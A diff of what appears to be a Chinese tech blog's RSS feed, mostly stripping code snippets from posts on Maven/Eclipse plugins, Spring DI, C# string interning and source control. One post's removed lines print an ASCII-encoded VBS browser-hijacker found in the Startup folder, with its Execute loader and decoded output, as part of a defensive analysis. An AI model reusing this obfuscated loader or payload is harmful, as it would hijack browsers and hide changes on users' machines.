@@ -34,11 +34,9 @@ eclipse插件开发中，依赖的管理是个问题。如果采用常规的搞�
 首先说明一下目录结构。一个parent的maven工程，一个plugin工程，。两个features。一个是deps的。一个是plugin的，这个依赖deps是独立的mvn项目。可以先不用管。一个deps依赖工程（这个依赖工程独立）。 在主pom下。
 步骤如下。
 关于依赖部分
- 新建一个普通的mvn工程,比如deps。打包类型写成&amp;lt;packaging&amp;gt;bundle&amp;lt;/packaging&amp;gt;,同时在pom.xml中添加build部分
-&amp;lt;build&amp;gt; &amp;lt;plugins&amp;gt; &amp;lt;plugin&amp;gt; &amp;lt;groupId&amp;gt;org.apache.felix&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;maven-bundle-plugin&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;3.0.1&amp;lt;/version&amp;gt; &amp;lt;extensions&amp;gt;true&amp;lt;/extensions&amp;gt; &amp;lt;configuration&amp;gt; &amp;lt;niceManifest&amp;gt;true&amp;lt;/niceManifest&amp;gt; &amp;lt;manifestLocation&amp;gt;META-INF&amp;lt;/manifestLocation&amp;gt; &amp;lt;instructions&amp;gt; &amp;lt;Bundle-SymbolicName&amp;gt;${project.artifactId}&amp;lt;/Bundle-SymbolicName&amp;gt; &amp;lt;Embed-Dependency&amp;gt;*&amp;lt;/Embed-Dependency&amp;gt; &amp;lt;Embed-Transitive&amp;gt;true&amp;lt;/Embed-Transitive&amp;gt; &amp;lt;Embed-Directory&amp;gt;lib&amp;lt;/Embed-Directory&amp;gt; &amp;lt;Bundle-ClassPath&amp;gt;{maven-dependencies}&amp;lt;/Bundle-ClassPath&amp;gt; &amp;lt;_exportcontents&amp;gt;*&amp;lt;/_exportcontents&amp;gt; &amp;lt;_failok&amp;gt;true&amp;lt;/_failok&amp;gt; &amp;lt;_nouses&amp;gt;true&amp;lt;/_nouses&amp;gt; &amp;lt;Import-Package&amp;gt;&amp;lt;/Import-Package&amp;gt; &amp;lt;/instructions&amp;gt; &amp;lt;/configuration&amp;gt; &amp;lt;/plugin&amp;gt; &amp;lt;/plugins&amp;gt; &amp;lt;/build&amp;gt;  然后正常添加一些依赖到这个工程中。然后执行一下mvn clean install ，你就会发现本地mvn仓库生成了一个jar包，这个jar里直接打包了所有的jar
+ 新建一个普通的mvn工程,比如deps。打包类型写成&amp;lt;packaging&amp;gt;bundle&amp;lt;/packaging&amp;gt;,同时在pom.xml中添加build部分  &amp;lt;build&amp;gt; &amp;lt;plugins&amp;gt; &amp;lt;plugin&amp;gt; &amp;lt;groupId&amp;gt;org.apache.felix&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;maven-bundle-plugin&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;3.0.1&amp;lt;/version&amp;gt; &amp;lt;extensions&amp;gt;true&amp;lt;/extensions&amp;gt; &amp;lt;configuration&amp;gt; &amp;lt;niceManifest&amp;gt;true&amp;lt;/niceManifest&amp;gt; &amp;lt;manifestLocation&amp;gt;META-INF&amp;lt;/manifestLocation&amp;gt; &amp;lt;instructions&amp;gt; &amp;lt;Bundle-SymbolicName&amp;gt;${project.artifactId}&amp;lt;/Bundle-SymbolicName&amp;gt; &amp;lt;Embed-Dependency&amp;gt;*&amp;lt;/Embed-Dependency&amp;gt; &amp;lt;Embed-Transitive&amp;gt;true&amp;lt;/Embed-Transitive&amp;gt; &amp;lt;Embed-Directory&amp;gt;lib&amp;lt;/Embed-Directory&amp;gt; &amp;lt;Bundle-ClassPath&amp;gt;{maven-dependencies}&amp;lt;/Bundle-ClassPath&amp;gt; &amp;lt;_exportcontents&amp;gt;*&amp;lt;/_exportcontents&amp;gt; &amp;lt;_failok&amp;gt;true&amp;lt;/_failok&amp;gt; &amp;lt;_nouses&amp;gt;true&amp;lt;/_nouses&amp;gt; &amp;lt;Import-Package&amp;gt;&amp;lt;/Import-Package&amp;gt; &amp;lt;/instructions&amp;gt; &amp;lt;/configuration&amp;gt; &amp;lt;/plugin&amp;gt; &amp;lt;/plugins&amp;gt; &amp;lt;/build&amp;gt; 然后正常添加一些依赖到这个工程中。然后执行一下mvn clean install ，你就会发现本地mvn仓库生成了一个jar包，这个jar里直接打包了所有的jar
 关于插件部分
- 新建一个类型为pom的parent工程。用来包含下面的子工程，通过
-&amp;lt;modules&amp;gt; &amp;lt;module&amp;gt;xxx.plugin.1&amp;lt;/module&amp;gt; &amp;lt;module&amp;gt;xxx.plugin.2&amp;lt;/module&amp;gt; &amp;lt;/modules&amp;gt; 来管理。同时 添加如下的插件
+ 新建一个类型为pom的parent工程。用来包含下面的子工程，通过  &amp;lt;modules&amp;gt; &amp;lt;module&amp;gt;xxx.plugin.1&amp;lt;/module&amp;gt; &amp;lt;module&amp;gt;xxx.plugin.2&amp;lt;/module&amp;gt; &amp;lt;/modules&amp;gt; 来管理。同时 添加如下的插件
 &amp;lt;properties&amp;gt; &amp;lt;tycho.version&amp;gt;0.24.0&amp;lt;/tycho.version&amp;gt; &amp;lt;/properties&amp;gt; &amp;lt;build&amp;gt; &amp;lt;plugins&amp;gt; &amp;lt;plugin&amp;gt; &amp;lt;groupId&amp;gt;org.apache.maven.plugins&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;maven-source-plugin&amp;lt;/artifactId&amp;gt; &amp;lt;executions&amp;gt; &amp;lt;execution&amp;gt; &amp;lt;id&amp;gt;attach-sources&amp;lt;/id&amp;gt; &amp;lt;phase&amp;gt;none&amp;lt;/phase&amp;gt; &amp;lt;/execution&amp;gt; &amp;lt;/executions&amp;gt; &amp;lt;version&amp;gt;2.4&amp;lt;/version&amp;gt; &amp;lt;/plugin&amp;gt; &amp;lt;plugin&amp;gt; &amp;lt;groupId&amp;gt;org.eclipse.tycho&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;tycho-maven-plugin&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;${tycho.version}&amp;lt;/version&amp;gt; &amp;lt;extensions&amp;gt;true&amp;lt;/extensions&amp;gt; &amp;lt;/plugin&amp;gt; &amp;lt;plugin&amp;gt; &amp;lt;groupId&amp;gt;org.</description>
     </item>
     
@@ -53,18 +51,14 @@ eclipse插件开发中，依赖的管理是个问题。如果采用常规的搞�
 2)constructor注入(构造器)
 1.Setter注入 是最流行最简单的DI方法，通过一个setter方法来完成依赖。
 例子：
-一个有一个setter方法的Helper类 package com.mkyong.output;
-import com.mkyong.output.IOutputGenerator;
-public class OutputHelper { IOutputGenerator outputGenerator;
-public void setOutputGenerator(IOutputGenerator outputGenerator){ this.outputGenerator = outputGenerator; } } 再写一个bean配合iwenjianshengming这些bean，并且通过property(属性)标签来设置依赖 &amp;lt;beans xmlns=&amp;ldquo;http://www.springframework.org/schema/beans&amp;quot; xmlns:xsi=&amp;ldquo;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xsi:schemaLocation=&amp;ldquo;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd&amp;quot;&amp;gt;
-&amp;amp;lt;bean id=&amp;#34;OutputHelper&amp;#34; class=&amp;#34;com.mkyong.output.OutputHelper&amp;#34;&amp;amp;gt; &amp;amp;lt;property name=&amp;#34;outputGenerator&amp;#34;&amp;amp;gt; &amp;amp;lt;ref bean=&amp;#34;CsvOutputGenerator&amp;#34; /&amp;amp;gt; &amp;amp;lt;/property&amp;amp;gt; &amp;amp;lt;/bean&amp;amp;gt; &amp;lt;bean id=&amp;ldquo;CsvOutputGenerator&amp;rdquo; class=&amp;ldquo;com.mkyong.output.impl.CsvOutputGenerator&amp;rdquo; /&amp;gt; &amp;lt;bean id=&amp;ldquo;JsonOutputGenerator&amp;rdquo; class=&amp;ldquo;com.mkyong.output.impl.JsonOutputGenerator&amp;rdquo; /&amp;gt;
-&amp;lt;/beans&amp;gt; 看到了把。我们只需要一个setter方法把CsvOutputGenerator注入进去就行了
+一个有一个setter方法的Helper类
+再写一个bean配合iwenjianshengming这些bean，并且通过property(属性)标签来设置依赖
+看到了把。我们只需要一个setter方法把CsvOutputGenerator注入进去就行了
 2.Constructor注入 这种方式是通过一个构造函数来完成依赖设置的
 例子：
-一个有着一个构造函数的Helper类 package com.mkyong.output;
-import com.mkyong.output.IOutputGenerator;
-public class OutputHelper { IOutputGenerator outputGenerator;
-OutputHelper(IOutputGenerator outputGenerator){ this.outputGenerator = outputGenerator; } } 然后当然是一个bean配置文件了。通过constructor-arg标签来写依赖 &amp;lt;beans xmlns=&amp;ldquo;http://www.</description>
+一个有着一个构造函数的Helper类
+然后当然是一个bean配置文件了。通过constructor-arg标签来写依赖
+该选哪个？ 没有硬性规定，哪个合适就用那个，由于setter的简单性，一般还是setter用得多。</description>
     </item>
     
     <item>
@@ -75,8 +69,7 @@ OutputHelper(IOutputGenerator outputGenerator){ this.outputGenerator = outputGen
       <guid>https://leizhiyuan.github.io/2013/09/19/maven%E6%8F%90%E7%A4%BA%E7%BC%BA%E5%B0%91tools.jar/</guid>
       <description>记录一下。
 这两天在熟悉Maven，长见识了.后续可能的话会写上一两篇，今天配置的时候提示tools.jar文件。于是使用everything搜了一下，本机的jdk目录还真没有，最后搜了一下，发现是安装jdk时候的问题，具体就是因为安装jdk的时候，后面被让继续安装jre，这个时候，我为了方便，将jre安装在了jdk的目录里，结果导致jre会覆盖到jdk的这两个文件。同时还会覆盖dt.jar这个包，于是，就没了。。这个问题略隐晦了..
-&amp;nbsp;
-重新安装了jdk，将jdk和jre分开目录，然后设置一下jdk的lib目录到classpath就可以了，问题解决。</description>
+ 重新安装了jdk，将jdk和jre分开目录，然后设置一下jdk的lib目录到classpath就可以了，问题解决。</description>
     </item>
     
     <item>
@@ -86,7 +79,7 @@ OutputHelper(IOutputGenerator outputGenerator){ this.outputGenerator = outputGen
       
       <guid>https://leizhiyuan.github.io/2013/07/26/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/</guid>
       <description>这两天在读《软件测试》，书不厚，也就300页，有些观念还是挺诧异的，比如软件功能超出产品说明书也算作软件缺陷&amp;hellip;想想也能明白，只是猛然看到还是很惊异..简单记录一下读书过程中一些重要的笔记.留作备份.
-软件缺陷： 1.软件为达到产品说明书表明的功能 2.软件出现了产品说明书指明不会出现的错误. 3.软件功能超出产品说明书指明范围 4.软件未达到产品说明书虽未指出但应达到的目标 5.软件测试员认为软件难以理解，不易使用，运行速度缓慢，或者最终用户认为不好.   为什么会出现软件缺陷 最大的原因是产品说明书.而并非编程错误，第二大来源是设计方案  软件测试员的目标是发现软件缺陷，进可能早一些，确保其得到修复  完全测试程序是不可能的  不要总是报告坏消息，如果软件没有错误，就夸他们，和他们聊天  可靠性只是质量的一个方面，可能还包括功能齐全，技术制裁，包括色彩等  在设计和执行测试案例时，首先进行通过测试，在破坏性试验之前看看软件基本功能是否实现是很重要的，否则在正常使用软件时就会奇怪为什么有这么多软件缺陷  软件测试员必须测试程序的状态及其转换  动态白盒测试的目标是寻找软件缺陷，调试则是为了修复他们  静态黑盒子（审查设计说明书），动态黑盒子，静态白盒子，动态白盒子  进行白盒测试前，一定要根据说明书建立黑盒测试案例  语句覆盖是程序的所有语句执行，分支覆盖则是所有分支都被执行，条件覆盖则要保证IF语句的每一种可能性都被覆盖  优秀UI的七个要素： 1.符合标准和规范，2.灵活性，3.正确性。4.直观性。5.舒适性，6.实用性。7.一致性   测试存根用于自顶向下的测试，清查到低级模块或者把自己替换为低级模块，主要测试高级模块，外表和行为就像是低级模块</description>
+软件缺陷：</description>
     </item>
     
     <item>
@@ -128,8 +121,11 @@ window如何知道系统配置的细节呢。答案就是windows会挂载一种�
       
       <guid>https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/</guid>
       <description>今天把电脑还原到了11月7号。结果eset更新后报C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。
-由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。 strs = Array(68,111,13,10,32,32,32,32,83,101,116,32,111,98,106,87,77,73,83,101,114,118,105,99,101,32,61,32,71,101,116,79,98,106,101,99,116,40,34,119,105,110,109,103,109,116,115,58,92,92,46,92,114,111,111,116,92,99,105,109,118,50,34,41,13,10,32,32,32,32,83,101,116,32,99,111,108,80,114,111,99,101,115,115,101,115,32,61,32,111,98,106,87,77,73,83,101,114,118,105,99,101,46,69,120,101,99,81,117,101,114,121,40,34,83,101,108,101,99,116,32,42,32,102,114,111,109,32,87,105,110,51,50,95,80,114,111,99,101,115,115,34,41,13,10,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,13,10,32,32,32,32,70,111,114,32,69,97,99,104,32,111,98,106,80,114,111,99,101,115,115,32,73,110,32,99,111,108,80,114,111,99,101,115,115,101,115,13,10,32,32,32,32,32,32,32,32,73,102,32,111,98,106,80,114,111,99,101,115,115,46,78,97,109,101,32,61,32,34,117,115,101,114,105,110,105,116,46,101,120,101,34,32,84,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,49,13,10,32,32,32,32,32,32,32,32,32,32,32,32,69,120,105,116,32,70,111,114,13,10,32,32,32,32,32,32,32,32,69,110,100,32,73,102,13,10,32,32,32,32,78,101,120,116,13,10,32,32,32,32,73,102,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,32,84,104,101,110,32,69,120,105,116,32,68,111,13,10,32,32,32,32,87,83,99,114,105,112,116,46,83,108,101,101,112,32,49,48,48,13,10,76,111,111,112,13,10,13,10,115,80,97,103,101,32,61,32,34,104,116,116,112,58,47,47,119,119,119,46,57,57,57,46,99,111,109,47,63,111,110,101,34,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,34,72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,73,110,116,101,114,110,101,116,32,69,120,112,108,111,114,101,114,92,77,97,105,110,92,83,116,97,114,116,32,80,97,103,101,34,44,32,115,80,97,103,101,13,10,13,10,115,82,101,103,80,97,116,104,32,61,32,34,72,75,76,77,92,83,79,70,84,87,65,82,69,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,32,83,99,114,105,112,116,32,72,111,115,116,92,83,101,116,116,105,110,103,115,34,13,10,79,110,32,69,114,114,111,114,32,82,101,115,117,109,101,32,78,101,120,116,13,10,105,69,110,97,98,108,101,100,32,61,32,111,98,106,83,104,101,108,108,46,82,101,103,82,101,97,100,32,95,13,10,40,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,41,13,10,73,102,32,69,114,114,46,78,117,109,98,101,114,32,61,32,48,32,84,104,101,110,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,34,44,32,105,69,110,97,98,108,101,100,44,32,34,82,69,71,95,68,87,79,82,68,34,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,68,101,108,101,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,13,10,69,110,100,32,73,102,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,13,10,83,101,116,32,102,32,61,32,111,98,106,83,104,101,108,108,46,71,101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101) 后半段是 For i = 0 To UBound(strs) runner = runner &amp;amp; Chr(strs(i)) Next Execute runner 虽说对vbs不怎么熟，但也知道vbs经常用来写个启动项啊。加个用户啊。之类的。后半句很好懂。就是把ascii码转换成字符串，然后执行。字面意思看看就行了。其实应该可以直接将Execute runner 改为 MsgBox runner就能输出了。但eset不能关闭。所以最后还是选择用C#来写了。
-解码嘛。很简单。VS刚好开着。直接写吧。 byte[] strs = {68，101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101}; System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding(); Console.WriteLine(asciiEncoding.GetString(strs)); 运行后输出 Do Set objWMIService = GetObject(&amp;ldquo;winmgmts:\.\root\cimv2&amp;rdquo;) Set colProcesses = objWMIService.ExecQuery(&amp;ldquo;Select * from Win32_Process&amp;rdquo;) FoundProcess = 0 For Each objProcess In colProcesses If objProcess.Name = &amp;ldquo;userinit.exe&amp;rdquo; Then FoundProcess = 1 Exit For End If Next If FoundProcess = 0 Then Exit Do WScript.</description>
+由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。
+后半段是
+虽说对vbs不怎么熟，但也知道vbs经常用来写个启动项啊。加个用户啊。之类的。后半句很好懂。就是把ascii码转换成字符串，然后执行。字面意思看看就行了。其实应该可以直接将Execute runner 改为 MsgBox runner就能输出了。但eset不能关闭。所以最后还是选择用C#来写了。
+解码嘛。很简单。VS刚好开着。直接写吧。
+结合后半段。简单读一读，就知道这个先找了一下userinit.exe进程。然后改了注册表并且设置了浏览器首页为999这个什么网站，我打开发现是个导航站。。人家hao123做个导航站赚钱了。。你们要不要这样跟风啊。。</description>
     </item>
     
     <item>
@@ -141,41 +137,34 @@ window如何知道系统配置的细节呢。答案就是windows会挂载一种�
       <description>上周，在Red Gate好朋友的帮助下。我发起了一个名为小竞赛赢得优秀的SQL Source Control 5份授权的活动。参加的方式很简单-分享你使用源代码控制过程中，本可以避免的最痛苦的经历
 许多痛苦的故事都出现了。但是我认为这五个获奖者的故事值得分享，并且我都做了评论，因为我觉得随着时间的流逝，这些故事依然对我们有所启发。那么，开始享受这些故事吧，我希望这些知识中的闪光点能够帮助你以后不会掉进相同的陷阱里。
 给获奖者：希望那些授权可以帮助抚慰你们关于那些已经过去的痛苦记忆。不久我会联系你们关于奖项颁发的相关事宜。
-&amp;nbsp;
-1.通过Ctrl-Z来进行源代码控制
+ 1.通过Ctrl-Z来进行源代码控制
 第一个故事来自 courtesy of MyChickenNinja ，仅仅文字就看得我头疼。在这个特殊的故事里。应用程序被前员工破坏了。。这非常头疼。但是至少还是有很多方法可以恢复代码的。如果不要求数据的话。。
 第一个问题是备份，最近的备份已经是3周前的。这绝对是一个教训—你的环境真的备份了吗？一会我会在另一个故事里简单的再说到这个问题。故事的核心部分是通过Ctrl-Z来进行伪源代码控制
 他们运行他们的代码，并且不断地更新，也包括开发环境，并且使用Ctrl-Z来撤销坏的改变
 好吧。这实在令人难以置信-如果你的应用程序已经做了一些编辑。然后被关闭了。怎么办？或者PC关机了？等等—他还说他们在哪写代码，哪儿就是开发环境？记住！撤销不是源代码控制！
-&amp;nbsp;
-2。多个数据库和集成问题
+ 2。多个数据库和集成问题
 第二个故事来自Brandon Thompson，他极度不开心，因为他工作在一个有着很多数据库源的环境里，并且，这些数据库都在正在进行的开发项目下面，数据库集成非常困难，这就意味着处理多个数据库备份可能还有个在海外。。
 我们的开发团队在海外，因为他们有他们自己的数据库集，这些数据库我从没看到过。但是他们会把改变的文件发给我们来适应我们的开发环境
 我发现最痛苦的是简单重复的手工劳动仅仅是使得大家能够协同的更好。这是没有一点创新并且没有任何增值的行为，比如增加新的特性，这就导致除了干这些。没什么时间真正在写代码了。
 源代码控制是为了能够保证团队之间平稳尽量无摩擦的一起工作。它是项目的一个润滑剂，和持续集成开发还有自动部署都属于同一类。这些都是软件开发中的“面包和黄油”，是任何成功团队编写代码的基础。
-&amp;nbsp;
-3. 依赖未测试的备份
+ 3. 依赖未测试的备份
 下一个是Barry Anderson，他写了一个我们都曾经经历过的痛苦：不能从备份恢复了！事实上在Barry的故事里。几个月都没备份了。之前备份本身还是坏的。这太糟糕了。但是，对于那些依赖备份的人来说这是一个严重的疏忽。
 当然对于这个疏忽也有自己的借口。Barry解释道：
 我们的经理（不是存储团队的）后来告诉我们既没时间也没空间来测试备份了。。。
 备份是一件很重要的事情。但从备份可以恢复也是同等重要，我最近在配置大量的新环境的时候，备份本应该发生的但是就是没有发生。只有当我坚持要进行恢复测试的时候，问题才浮出水面，对于很多人来说。只有当他们真的需要从一系列的数据丢失中恢复数据的时候，才发现不能恢复了。。测试你的备份，恢复他们，不要相信任何人的说辞.
-&amp;nbsp;
-4.人工合并工具
+ 4.人工合并工具
 来自Graham Sutherland的故事讲了一个人来做机器工作的故事
 我们有一些开发人员，每一个在他们的硬盘上的都有整个项目的一个副本，每一次一个改变发生的时候，我们就会下载技术老大改变的源代码，然后使用diff工具来查看改变。然后手工更新他们。一行一行。。全靠双手。。
 这个故事比听起来还要不可思议，在源代码控制工具出现以前这确实是存在的。一个海外开发团队成员就是这样干的。随后他们这样解释：带头的开发者需要在提交前检查其他开发人员的工作进度。
 这确实是类似于之前的观点,在有多个数据库集成的情况下;我们有技术来解决这些问题!每当一个人在软件开发中从事任何劳动密集型,重复的过程,你真的不得不停下来问:“有没有更好的方法?”通常是有的。
-&amp;nbsp;
-5.剪切和粘贴版本控制
+ 5.剪切和粘贴版本控制
 Robin Vessey 让我产生了共鸣，因为它真的是伪VCS（Version Control System）最普遍的方式。剪切或者复制，然后粘贴到新的位置，通过这种方式会包含重复的目录或者文件。因此一般这些文件会被以日期或者其他标识符来标识时间帧。
 在Robin的故事里，他打算通过网络移动一个目录结构。
 他很简单但高效，我剪贴然后粘贴了一个完整的目录树，任何东西，通过网络发送。但这些文件留在了我这一边。却没有到达另一边。我仍然不知道为什么。
 我必须承认,我对任何剪切和粘贴文件的操作的态度是非常谨慎的,因为我看到这种情况在一个本地文件系统中发生了很多次，更不用说通过网络了，在上面的的Robin的故事,就是没有备份被恢复,因为他们一段时间后会停止备份，“因为我们没有更多的空间”。是不是感觉好像和前面某一方法很像。。
-&amp;nbsp;
-总结
+ 总结
 工作在一个没有源代码控制的环境下是很可怕的。现在就停止吧。伙计们，我们是很优秀，但在在源代码控制下工作是很专业的。并且现在有很多的VCS产品。托管服务，集成工具，真心是没有任何理由不把代码-包括数据库，部署在源代码控制下。
-&amp;nbsp;
-原文地址:5-ways-to-do-source-control-really
+ 原文地址:5-ways-to-do-source-control-really
 著作权声明：本文由http://leaver.me 翻译，欢迎转载分享。请尊重作者劳动，转载时保留该声明和作者博客链接，谢谢！</description>
     </item>
     
@@ -186,12 +175,21 @@ Robin Vessey 让我产生了共鸣，因为它真的是伪VCS（Version Control 
       
       <guid>https://leizhiyuan.github.io/2012/07/08/c#%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A9%BB%E7%95%99/</guid>
       <description>字符串string可以理解为char[]，他是一个引用类型。
-字符串创建  操作上类似于int，char等类型，直接进行赋值，string str=&amp;ldquo;bystander&amp;rdquo;;虽然string 是个类，但是如果你天真的使用 string str=new string(&amp;ldquo;bystander&amp;rdquo;); 来构造，会导致一个编译错误。因为System.String只提供了数个接受Char*，Char[]类型参数的构造函数。 所以只能像下面这样使用， Char[] cs={&amp;lsquo;b&amp;rsquo;,&amp;lsquo;y&amp;rsquo;,&amp;lsquo;e&amp;rsquo;}; String str=new String(cs); 看出来了吧，很麻烦的。所以一般还是使用第一种。
+字符串创建  操作上类似于int，char等类型，直接进行赋值，string str=&amp;quot;bystander&amp;rdquo;;虽然string 是个类，但是如果你天真的使用
+来构造，会导致一个编译错误。因为System.String只提供了数个接受Char*，Char[]类型参数的构造函数。 所以只能像下面这样使用，
+看出来了吧，很麻烦的。所以一般还是使用第一种。
  字符串恒定性  恒定性(Immutability)，是指字符串一经创建，就不可改变，这是String最为重要的特性之一。具体来说，就是字符串一旦创建，就会在托管堆上分配一块连续的内存空间，我们对其的任何改变都不会影响到原有的String对象，而是重新创建的新的String对象。类似Insert，Substring，ToUpper都只是创建出了新的临时的字符串，会成为下次垃圾回收的目标。 好处：
  保证了对String对象的任何操作不会改变源字符串。 恒定性还意味着操作字符串不会出现线程同步问题 恒定性一定程度上，成就了字符串驻留。   字符串驻留  CLR维护一个表来存放字符串，该表叫做拘留表（或驻留池），他包含程序上以编程方式声明或创建的每一个唯一的字符串的引用，因此具有特定值的实例在系统中只有一个。如果将同一个字符串分配给多个变量，那么CLR就会向拘留池检索相同引用，并分配给变量。
-通过下面这个例子来说明： class StringInterning { public static void Main() { string strA = &amp;ldquo;bystander&amp;rdquo;; string strB = &amp;ldquo;bystander&amp;rdquo;; Console.WriteLine(ReferenceEquals(strA,strB)); string strC = &amp;ldquo;by&amp;rdquo;; string strD = strC+&amp;ldquo;stander&amp;rdquo;; Console.WriteLine(ReferenceEquals(strA,strD)); strD=String.Intern(strD); Console.WriteLine(ReferenceEquals(strA,strD)); } } 猜猜答案是什么。。 正确答案是：True，False，True 为什么不是我们通常认为的那样呢。这就是因为字符串驻留了
+通过下面这个例子来说明：
+猜猜答案是什么。。 正确答案是：True，False，True 为什么不是我们通常认为的那样呢。这就是因为字符串驻留了
 缘起  String类型的特性恒定性，对字符串的任何操作都只会创建新的字符串，这会导致性能下降，而String又用的很频繁，为此，CLR使用字符串驻留来解决这一问题。为此，CLR内部维护一个哈希表，来管理其创建的大部分string对象。其中Key为string本身，Value为分配给对应的string的内存地址。
- 细节  string strA = &amp;ldquo;bystander&amp;rdquo;; CLR初始化时，创建一个空的哈希表，当JIT编译方法的时候，会首先在哈希表中查找每一个字符串常量，显然找不到任何&amp;rdquo;bystander&amp;rdquo;变量，因此会在托管堆中创建一个新的string对系那个strA，并更新哈希表，Key被赋值为&amp;rdquo;bystander&amp;rdquo;,Value被赋值为strA的引用.</description>
+ 细节  　CLR初始化时，创建一个空的哈希表，当JIT编译方法的时候，会首先在哈希表中查找每一个字符串常量，显然找不到任何&amp;quot;bystander&amp;quot;变量，因此会在托管堆中创建一个新的string对系那个strA，并更新哈希表，Key被赋值为&amp;quot;bystander&amp;rdquo;,Value被赋值为strA的引用.也就是Value内保留了&amp;quot;bystander&amp;quot;在托管堆中的引用地址.
+　接着,JIT根据&amp;quot;bystander&amp;quot;查找哈希表,结果找到了,所以JIT不做操作,只把找到的key对应的Value值赋给了strB对象.因此,第一个输出为true,引用相等.
+　同样,JIT向哈希表中添加了Key为&amp;quot;by&amp;rdquo;,Value为托管堆上&amp;quot;by&amp;quot;的地址.返回strC对象.但是注意,strD不同,JIT不检测,因为strD他是动态生成的.这样的字符串不会被添加到哈希表中进行维护,而是在托管堆中直接分配,所以第二个Console输出False.
+　对于第三个,我们首先看看Intern方法和IsInterned方法,对于动态生成的字符串,因为没有添加到CLR维护的哈希表,所以字符串驻留机制对其失效,但是可以手工开启,来实现高效的比较字符串相等.
+　两者的机制都是去哈希表中查找是否存在str字符串,找到的话也都返回对str的引用,不同的是当哈希表中没有str的话,IsInterned返回null,而Intern将把这个字符串添加到哈希表,并返回引用.注意,IsInterned返回非null并不代表两个字符串引用了相同的地址. 所以
+就很好理解了.
+  </description>
     </item>
     
     <item>
@@ -203,7 +201,7 @@ Robin Vessey 让我产生了共鸣，因为它真的是伪VCS（Version Control 
       <description>资源来自：金山网络
 　我比较认真的读完了这本小册子，确实收获还是蛮大的。前几天有个朋友问我电池的事情，我以前看过电池的一些保养的。当时就知道锂电池是首次使用是不需要进行12小时充电的。。看到这本小册子的时候，证实了我没乱讲哈。。
 　然后里面还说道一个就是很多人不相信软件能够保养电池。其实真的是可以的。。理由不赘述。你可以自己读一读。。我自己感觉对普通用户很有用的是30页的那一节。讲到的问题有；
- 电池管理类软件对电池寿命没用？ 充电习惯对电池寿命没有用？ 一块电池都只够安卓撑一天？ 提示电池充满就可以马上拔掉电源 ？ 不管怎么用待机时间都一样？ 手机还有一半电量的时候不必担心？ 新电池前3次需充满12小时？ 涓流充电有用吗？ 手机电池充一夜也没什么危害？ 边充电边使用对电池无伤害？ 突然断电再立刻充上会伤害电池吗？ 充电不饱和会伤害电池吗？ iPhone和iPad的充电器可以混用吗？ 经常把电用光再充对电池好不好？  书籍下载：移动设备电池使用白皮书</description>
